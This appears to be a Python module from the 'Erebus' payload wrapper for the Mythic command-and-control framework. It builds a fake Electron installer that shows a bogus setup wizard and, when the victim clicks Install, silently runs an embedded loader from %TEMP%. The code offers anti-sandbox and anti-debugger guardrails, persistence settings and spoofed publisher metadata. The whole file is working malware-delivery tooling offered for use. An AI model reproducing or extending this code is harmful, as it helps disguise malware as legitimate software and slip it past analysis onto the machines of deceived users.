"""
Electron fake-installer container.

Wraps the compiled loader artifact in ``payload/`` inside an Electron NSIS
installer that presents a fake setup wizard. When the victim clicks
Install, the wizard copies the embedded loader tree to ``%TEMP%\\inst-<uuid>``
and spawns the configured entry point detached + hidden.

Two build modes:

- **In-Container (Wine)** - runs ``make release`` inside the Docker
  container (npm + electron-builder under wine for rcedit/winCodeSign).
- **Deferred (Erebus.Helper)** - copies the staged project into
  ``payload/electron_src/`` and emits a ``build_electron.bat`` runbook for
  the operator to execute on a Windows host via
  ``python erebus_helper.py electron``.

The function mirrors the signature of the sibling ``container_msi`` /
``container_iso`` builders.
"""

import pathlib
import shutil
import subprocess
from typing import Optional

from jinja2 import Environment, FileSystemLoader

# container_electron.py lives at:
#   erebus_wrapper/erebus/modules/archive/container_electron.py
# parents[0]=archive  parents[1]=modules  parents[2]=erebus  parents[3]=erebus_wrapper
# The Jinja templates + Erebus.Electron project sit under erebus_wrapper/agent_code/,
# so we anchor at parents[3], NOT parents[2] (which resolves to erebus/agent_code and
# doesn't exist).
PKG_ROOT = pathlib.Path(__file__).resolve().parents[3]
AGENT_CODE = PKG_ROOT / "agent_code"
TEMPLATES_DIR = AGENT_CODE / "templates"
ELECTRON_PROJECT_SUBPATH = pathlib.Path("Erebus.Loaders") / "Erebus.Electron"

ICON_SOURCE_NAME = "icon-source.png"
_FALLBACK_ICON = AGENT_CODE / "Erebus.Loaders" / "Assets" / "Erebus.png"


def _looks_like_svg(data: bytes) -> bool:
    head = data[:512].lstrip()
    return head.startswith(b"<?xml") or head.startswith(b"<svg") or b"<svg" in head[:400]


def _rasterize_svg(svg_bytes: bytes, size: int = 512) -> bytes:
    """
    Rasterize an SVG to a square PNG at the given size using cairosvg.
    Pillow can then load the PNG bytes directly.
    """
    try:
        import cairosvg
    except ImportError as e:
        raise RuntimeError(
            "SVG icon uploaded but cairosvg is not installed. "
            "Add `cairosvg` to requirements.txt and install libcairo2 in the Dockerfile, "
            "or upload a raster image (PNG/JPEG/GIF/BMP/WEBP/TIFF) instead."
        ) from e
    return cairosvg.svg2png(
        bytestring=svg_bytes,
        output_width=size,
        output_height=size,
    )


def _normalize_icon_bytes(raw) -> bytes:
    """
    Coerce whatever ``SendMythicRPCFileGetContent`` returned into the raw
    bytes of an image file. Handles:

    - ``bytes`` / ``bytearray`` / ``memoryview`` - cast through to bytes
    - ``str`` wrapping base64 content (optionally with ``data:<mime>;base64,``)
    - Raw bytes that happen to themselves be base64-encoded ASCII
    - SVG (text or base64) - rasterized via cairosvg to a 512x512 PNG
    """
    import base64

    if raw is None:
        raise ValueError("uploaded icon content is None (fetch failed or empty)")
    if isinstance(raw, memoryview):
        raw = bytes(raw)
    if isinstance(raw, bytearray):
        raw = bytes(raw)
    if isinstance(raw, str):
        s = raw.strip()
        # data: URI
        if s.startswith("data:") and ";base64," in s:
            s = s.split(";base64,", 1)[1]
        # Raw SVG text
        if s.startswith("<?xml") or s.startswith("<svg"):
            return _rasterize_svg(s.encode("utf-8"))
        # Otherwise assume base64 text
        try:
            decoded = base64.b64decode(s, validate=False)
        except Exception as e:
            raise ValueError(f"uploaded icon string not decodable as base64: {e}") from e
        if _looks_like_svg(decoded):
            return _rasterize_svg(decoded)
        return decoded

    if not isinstance(raw, (bytes,)):
        raise TypeError(f"unexpected icon content type: {type(raw).__name__}")

    if len(raw) == 0:
        raise ValueError("uploaded icon content is empty")

    # SVG delivered as raw bytes (most common when Mythic returns the
    # upload verbatim).
    if _looks_like_svg(raw):
        return _rasterize_svg(raw)

    # Image magic prefixes we can decode directly.
    known_magics = (
        b"\x89PNG\r\n\x1a\n",  # PNG
        b"\xff\xd8\xff",       # JPEG
        b"GIF87a", b"GIF89a",  # GIF
        b"BM",                 # BMP
        b"RIFF",               # WEBP (container)
        b"II*\x00", b"MM\x00*",  # TIFF
    )
    if any(raw.startswith(m) for m in known_magics):
        return raw

    # Bytes may themselves be base64-encoded ASCII (rare but observed).
    try:
        decoded = base64.b64decode(raw, validate=False)
        if _looks_like_svg(decoded):
            return _rasterize_svg(decoded)
        if any(decoded.startswith(m) for m in known_magics):
            return decoded
    except Exception:
        pass

    # Give up - return raw and let Pillow produce its own error.
    return raw


def _render_icon(
    project_dir: pathlib.Path,
    source_png: pathlib.Path,
    custom_bytes: Optional[bytes] = None,
) -> None:
    """
    Convert a PNG (or any Pillow-supported raster format) into a
    multi-size Windows .ico at ``{project_dir}/build/icon.ico`` so
    electron-builder can embed it in the portable PE resources via
    rcedit (under wine on Linux).

    If ``custom_bytes`` is provided (operator uploaded an image via the
    "3.E6a Electron Custom Icon" BuildParameter), those bytes are used;
    otherwise the vendored default at ``source_png`` is read from disk.
    """
    try:
        from PIL import Image, UnidentifiedImageError
    except ImportError as e:
        raise RuntimeError(
            "Pillow is required for Electron container icon conversion "
            "(add `Pillow` to requirements.txt)"
        ) from e

    ico_path = project_dir / "build" / "icon.ico"
    ico_path.parent.mkdir(parents=True, exist_ok=True)

    if custom_bytes is not None:
        normalized = _normalize_icon_bytes(custom_bytes)
        # Write to disk first - more reliable than BytesIO across Pillow
        # versions, and gives us a concrete file path for the error log.
        staged = project_dir / "build" / "icon-upload.bin"
        staged.write_bytes(normalized)
        try:
            img = Image.open(staged)
            img.load()  # force decode so format errors surface here
        except UnidentifiedImageError as e:
            header = normalized[:16].hex()
            raise RuntimeError(
                f"Uploaded custom icon could not be decoded by Pillow "
                f"(size={len(normalized)} bytes, header={header}). "
                f"Supported formats: PNG, JPEG, GIF, BMP, WEBP, TIFF, SVG "
                f"(SVG is rasterized to PNG via cairosvg)."
            ) from e
    else:
        icon_path = source_png if source_png.exists() else _FALLBACK_ICON
        if not icon_path.exists():
            raise FileNotFoundError(
                f"No icon source found. Checked: {source_png}, {_FALLBACK_ICON}"
            )
        img = Image.open(icon_path)

    img = img.convert("RGBA")
    # Multi-resolution ICO: Windows picks the best size for each surface
    # (taskbar, tray, explorer thumbs, shortcut arrows).
    sizes = [(16, 16), (24, 24), (32, 32), (48, 48), (64, 64), (128, 128), (256, 256)]
    img.save(str(ico_path), format="ICO", sizes=sizes)


_DEFAULT_GUARDRAILS = {
    "enabled": False,
    "dwellMs": 0,
    "requireMouseMovement": False,
    "checkDebugger": False,
    "checkSandboxEnv": False,
    "checkDefaultBadUsernames": False,
    "checkDefaultBadHostnames": False,
    "hostnameWhitelist": "",
    "hostnameBlocklist": "",
    "usernameWhitelist": "",
    "usernameBlocklist": "",
    "minScreenWidth": 0,
    "minScreenHeight": 0,
    "minCpuCount": 0,
    "minMemoryMb": 0,
    "maxIdleSeconds": 0,
    "preSpawnDelayMs": 0,
    "debugMode": False,
}

_DEFAULT_PERSISTENCE = {
    "enabled": False,
    "method": "none",
    "name": "",
    "installDir": "appdata",
}


def _render_config(
    project_dir: pathlib.Path,
    *,
    product: str,
    publisher: str,
    version: str,
    entry_format: str,
    entry_name: str,
    dll_entry: str,
    guardrails: Optional[dict] = None,
    persistence: Optional[dict] = None,
) -> None:
    gr = dict(_DEFAULT_GUARDRAILS)
    if guardrails:
        gr.update(guardrails)

    ps = dict(_DEFAULT_PERSISTENCE)
    if persistence:
        ps.update(persistence)
    if not ps["name"]:
        ps["name"] = product

    env = Environment(loader=FileSystemLoader(str(TEMPLATES_DIR)))
    tmpl = env.get_template("electron_config.js.j2")
    rendered = tmpl.render(
        PRODUCT=product,
        PUBLISHER=publisher,
        VERSION=version,
        ENTRY_FORMAT=entry_format,
        ENTRY_NAME=entry_name,
        DLL_ENTRY=dll_entry,
        GR_ENABLED=gr["enabled"],
        GR_DWELL_MS=gr["dwellMs"],
        GR_REQUIRE_MOUSE_MOVEMENT=gr["requireMouseMovement"],
        GR_CHECK_DEBUGGER=gr["checkDebugger"],
        GR_CHECK_SANDBOX_ENV=gr["checkSandboxEnv"],
        GR_CHECK_DEFAULT_BAD_USERNAMES=gr["checkDefaultBadUsernames"],
        GR_CHECK_DEFAULT_BAD_HOSTNAMES=gr["checkDefaultBadHostnames"],
        GR_HOSTNAME_WHITELIST=gr["hostnameWhitelist"],
        GR_HOSTNAME_BLOCKLIST=gr["hostnameBlocklist"],
        GR_USERNAME_WHITELIST=gr["usernameWhitelist"],
        GR_USERNAME_BLOCKLIST=gr["usernameBlocklist"],
        GR_MIN_SCREEN_WIDTH=gr["minScreenWidth"],
        GR_MIN_SCREEN_HEIGHT=gr["minScreenHeight"],
        GR_MIN_CPU_COUNT=gr["minCpuCount"],
        GR_MIN_MEMORY_MB=gr["minMemoryMb"],
        GR_MAX_IDLE_SECONDS=gr["maxIdleSeconds"],
        GR_PRE_SPAWN_DELAY_MS=gr["preSpawnDelayMs"],
        GR_DEBUG_MODE=gr["debugMode"],
        PERSIST_ENABLED=ps["enabled"],
        PERSIST_METHOD=ps["method"],
        PERSIST_NAME=ps["name"],
        PERSIST_INSTALL_DIR=ps["installDir"],
    )
    (project_dir / "src" / "config.js").write_text(rendered, encoding="utf-8")


def _apply_pe_metadata(
    project_dir: pathlib.Path,
    *,
    product: str,
    publisher: str,
    version: str,
    file_description: str,
    copyright_str: str,
) -> None:
    """
    Rewrite ``package.json`` and ``electron-builder.yml`` with operator-
    supplied metadata so electron-builder's rcedit pass bakes the right
    values into the PE resource table (visible on the file's Details tab).

    Field mapping (Windows shell property → source):
      - File description      → package.json.description
      - Product name          → electron-builder.yml.productName
      - Product version       → package.json.version
      - File version          → package.json.version (same)
      - Copyright             → electron-builder.yml.copyright
      - Company (Author)      → package.json.author
    """
    import json
    import re

    # --- package.json ------------------------------------------------------
    pkg_path = project_dir / "package.json"
    with pkg_path.open("r", encoding="utf-8") as f:
        pkg = json.load(f)
    pkg["version"] = version
    pkg["description"] = file_description
    pkg["author"] = publisher
    # productName here is a secondary source; electron-builder.yml takes
    # precedence but we keep them in sync for npm start tools.
    pkg["productName"] = product
    with pkg_path.open("w", encoding="utf-8") as f:
        json.dump(pkg, f, indent=2)
        f.write("\n")

    # --- electron-builder.yml ---------------------------------------------
    # Line-based rewrite: we control this file and the schema is stable.
    yml_path = project_dir / "electron-builder.yml"
    text = yml_path.read_text(encoding="utf-8")

    def _yaml_escape(value: str) -> str:
        # Double-quote strings containing risky characters; fall through
        # to bare form for simple values.
        if value == "" or any(c in value for c in ':#\n"\'\\'):
            escaped = value.replace("\\", "\\\\").replace('"', '\\"')
            return f'"{escaped}"'
        return value

    replacements = {
        "productName": product,
        "copyright": copyright_str,
    }
    for key, value in replacements.items():
        pattern = re.compile(rf"^{re.escape(key)}:.*$", re.MULTILINE)
        replacement = f"{key}: {_yaml_escape(value)}"
        if pattern.search(text):
            text = pattern.sub(replacement, text, count=1)
        else:
            text = replacement + "\n" + text
    yml_path.write_text(text, encoding="utf-8")


def _stage_payload(project_dir: pathlib.Path, payload_dir: pathlib.Path) -> None:
    """
    Stage **only** the single ``erebus.*`` loader binary into the Electron
    project's ``build/resources/payload/`` directory for electron-builder's
    extraResources directive.

    This is an allowlist, not a blocklist: every other file and every
    subdirectory in ``payload/`` is deliberately dropped, including:

    - Operator bookkeeping (``IOCs.txt``, ``erebus_helper.py``, ``build_*.bat``,
      ``*.readme.txt``, ``*.bas``, ``electron_src/``, …)
    - Trigger-only sidecars (``clickonce_trigger/``, decoy files, generated
      trigger artefacts from parallel ``0.9 Trigger Type`` selections)
    - ClickOnce publish satellite DLLs (the ClickOnce loader is typically
      self-contained single-file when publish flags are set; satellite DLLs
      that are required would make ClickOnce+Electron a non-viable combo)

    Any of the three loader output shapes (``erebus.exe``, ``erebus.dll``,
    ``erebus.xll``) is accepted - exactly one exists in ``payload/`` after a
    given build, matching the ``3.E4 Electron Entry Format`` the wizard
    spawns at install time.
    """
    resources_target = project_dir / "build" / "resources" / "payload"
    if resources_target.exists():
        shutil.rmtree(resources_target)
    resources_target.mkdir(parents=True, exist_ok=True)

    # Explicit allowlist: only files matching erebus.{exe,dll,xll} at the
    # top level of payload/ are staged. Subdirectories are never copied.
    allowed_loader_names = {"erebus.exe", "erebus.dll", "erebus.xll"}
    staged_any = False
    for item in payload_dir.iterdir():
        if not item.is_file():
            continue
        if item.name in allowed_loader_names:
            shutil.copy2(str(item), str(resources_target / item.name))
            staged_any = True

    if not staged_any:
        raise FileNotFoundError(
            f"No erebus.{{exe,dll,xll}} loader binary found in {payload_dir}. "
            "The Electron container requires a Loader build (0.0 Main Payload Type = Loader) "
            "with a completed loader compilation step before containerisation runs."
        )


def _find_nsis_output(dist_dir: pathlib.Path) -> Optional[pathlib.Path]:
    if not dist_dir.exists():
        return None
    preferred = sorted(
        (p for p in dist_dir.glob("*.exe") if "setup" in p.name.lower()),
        key=lambda p: p.stat().st_mtime,
        reverse=True,
    )
    if preferred:
        return preferred[0]
    fallback = sorted(dist_dir.glob("*.exe"), key=lambda p: p.stat().st_mtime, reverse=True)
    return fallback[0] if fallback else None


def build_electron_installer(
    build_path: pathlib.Path,
    product: str = "Acme Installer",
    publisher: str = "Acme Corporation",
    version: str = "1.0.0",
    arch: str = "x64",
    entry_format: str = "exe",
    entry_name: str = "erebus.exe",
    dll_entry: str = "DllMain",
    file_description: str = "Setup",
    copyright_str: str = "",
    custom_icon_bytes: Optional[bytes] = None,
    guardrails: Optional[dict] = None,
    persistence: Optional[dict] = None,
) -> pathlib.Path:
    """
    Wrap the compiled loader in the Electron fake-installer NSIS.

    :param build_path: Active Mythic build temp dir (contains payload/).
    :param product: Product name shown in the wizard and NSIS metadata.
    :param publisher: Publisher string embedded in the installer.
    :param version: Product version string.
    :param arch: "x64" or "ia32".
    :param entry_format: "exe" | "dll" | "xll".
    :param entry_name: Filename inside payload/ to spawn (e.g. "erebus.exe").
    :param dll_entry: rundll32 entry point name (only used when entry_format == "dll").
    :param custom_icon_bytes: Optional raw PNG bytes uploaded via the
        "3.E6a Electron Custom Icon" BuildParameter. Overrides the
        vendored default Erebus icon when supplied.
    :param guardrails: Optional dict of guardrail settings forwarded to
        the generated ``src/config.js``. Keys mirror the ``3.E9*``
        BuildParameters (enabled, dwellMs, requireMouseMovement,
        checkDebugger, hostnameWhitelist, ...). When omitted or
        ``enabled=False``, no guardrails run at install time.
    :param persistence: Optional dict of persistence settings. Keys:
        enabled (bool), method (str), name (str), installDir (str).
    :return: Path to the produced NSIS installer placed in payload/.
    """
    payload_dir = build_path / "payload"
    if not payload_dir.exists():
        raise FileNotFoundError(f"payload/ directory missing at {payload_dir}")

    project_dir = build_path / ELECTRON_PROJECT_SUBPATH
    if not project_dir.exists():
        raise FileNotFoundError(
            f"Erebus.Electron project missing at {project_dir}. "
            "Check that agent_code was copied into the build path."
        )

    _render_config(
        project_dir,
        product=product,
        publisher=publisher,
        version=version,
        entry_format=entry_format,
        entry_name=entry_name,
        dll_entry=dll_entry,
        guardrails=guardrails,
        persistence=persistence,
    )
    _apply_pe_metadata(
        project_dir,
        product=product,
        publisher=publisher,
        version=version,
        file_description=file_description,
        copyright_str=copyright_str,
    )
    _stage_payload(project_dir, payload_dir)
    _render_icon(
        project_dir,
        project_dir / "build" / ICON_SOURCE_NAME,
        custom_bytes=custom_icon_bytes,
    )

    # Wine + electron-builder is slow even after caches are prewarmed:
    # rcedit alone takes ~30s, NSIS pack another ~30-60s on cold wine.
    # Cap at 15 minutes to surface stalled builds with a useful error
    # rather than a silent timeout from whatever harness is calling us.
    try:
        proc = subprocess.run(
            ["make", "-C", str(project_dir), f"ARCH={arch}", "release"],
            capture_output=True,
            text=True,
            timeout=900,
        )
    except subprocess.TimeoutExpired as e:
        raise RuntimeError(
            "Electron in-container build exceeded 15 minute timeout. "
            "Check that node_modules and ELECTRON_*_CACHE were prewarmed "
            "in the Docker image; a cold build re-downloads ~400 npm "
            "deps + electron + winCodeSign + nsis-resources via wine.\n"
            f"partial stdout:\n{(e.stdout or b'').decode(errors='replace') if isinstance(e.stdout, (bytes, bytearray)) else (e.stdout or '')}\n"
            f"partial stderr:\n{(e.stderr or b'').decode(errors='replace') if isinstance(e.stderr, (bytes, bytearray)) else (e.stderr or '')}"
        ) from e
    if proc.returncode != 0:
        raise RuntimeError(
            f"Electron in-container build failed ({proc.returncode}):\n"
            f"stdout:\n{proc.stdout}\nstderr:\n{proc.stderr}"
        )

    nsis = _find_nsis_output(project_dir / "dist")
    if nsis is None:
        raise RuntimeError(f"electron-builder succeeded but no .exe found in {project_dir / 'dist'}")

    # Replace payload/ contents with exactly ONE file: the portable
    # Electron exe, named erebus.exe so the existing signing stage
    # (which hardcodes payload/erebus.{fmt}) finds it without a bypass.
    final_path = payload_dir / "erebus.exe"
    for item in list(payload_dir.iterdir()):
        if item.is_file():
            item.unlink()
        elif item.is_dir():
            shutil.rmtree(item)
    shutil.copy2(str(nsis), str(final_path))
    return final_path
